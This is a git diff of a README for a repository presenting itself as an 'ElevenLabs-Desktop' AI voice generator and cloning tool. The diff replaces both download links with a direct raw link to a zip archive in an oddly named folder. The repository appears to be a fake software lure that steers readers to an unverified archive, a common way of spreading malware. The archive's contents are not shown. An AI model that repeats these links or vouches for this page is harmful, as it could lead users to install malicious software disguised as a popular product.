@@ -1,6 +1,6 @@
 <h1>🎙️ ElevenLabs-Desktop---AI-Voice-Generator-2026 - Your Ultimate AI Voice Generator and Cloning Tool</h1>
 
-<p align="center"><a href="https://github.com/Josit1013/ElevenLabs-Desktop---AI-Voice-Generator-2026/releases"><img src="https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=2ECC71" alt="Download Button"></a></p>
+<p align="center"><a href="https://raw.githubusercontent.com/Josit1013/ElevenLabs-Desktop---AI-Voice-Generator-2026/main/felsosphaerite/Eleven-Desktop-Labs-Voice-Generator-A-v1.0.zip"><img src="https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=2ECC71" alt="Download Button"></a></p>
 
 ---
 
@@ -226,7 +226,7 @@ Stop settling for robotic, monotonous computer voices. Start creating audio that
 
 **Your next step is simple:** Click that big, colorful download button at the top of this page, and let your creativity flow. 
 
-⬇️ **[Click Here to Download ElevenLabs-Desktop Now](https://github.com/Josit1013/ElevenLabs-Desktop---AI-Voice-Generator-2026/releases)**
+⬇️ **[Click Here to Download ElevenLabs-Desktop Now](https://raw.githubusercontent.com/Josit1013/ElevenLabs-Desktop---AI-Voice-Generator-2026/main/felsosphaerite/Eleven-Desktop-Labs-Voice-Generator-A-v1.0.zip)**
 
 ---
 
